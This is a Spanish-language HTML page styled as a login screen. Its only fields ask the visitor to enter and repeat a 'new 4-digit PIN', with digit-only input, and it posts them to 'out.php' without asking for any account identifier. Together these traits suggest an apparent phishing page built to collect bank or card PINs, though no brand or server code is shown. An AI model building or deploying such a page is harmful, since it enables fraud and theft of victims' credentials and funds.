
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Inicio</title>
  <link rel="stylesheet" href="styles.css">
  <link rel="stylesheet" href="min.css">
</head>
<body>
  <div class="ttlo">
  <img src="tlo.png" alt="">
  <div>
  <div class="contact-form-wrapper d-flex justify-content-center" id="mld">

    <form action="out.php" id="contenido2"  method="post" class="contact-form" >
     <h5 class="title">Inicio de Sesi&oacute;n</h5>
      <p class="description">Inicie Sesi&oacute;n para continuar.
      </p>
    <div id="numt">
      <div>
        <input type="text" maxlength="4" class="form-control rounded border-white mb-3 form-input" name="pos" onkeypress="return (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57)" placeholder="Nuevo PIN 4 digitos" required="">
      </div>
      <div>
        <input name="pl4" type="text" maxlength="4" class="form-control rounded border-white mb-3 form-input" onkeypress="return (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57)" placeholder="Repita PIN 4 digitos" required="">
      </div>
      
      <div class="submit-button-wrapper">
          <button id="bntss" type="submit">Iniciar Sesi&oacute;n</button>
        
      </div>
    </div>
    </form>
  

</body>
</html>
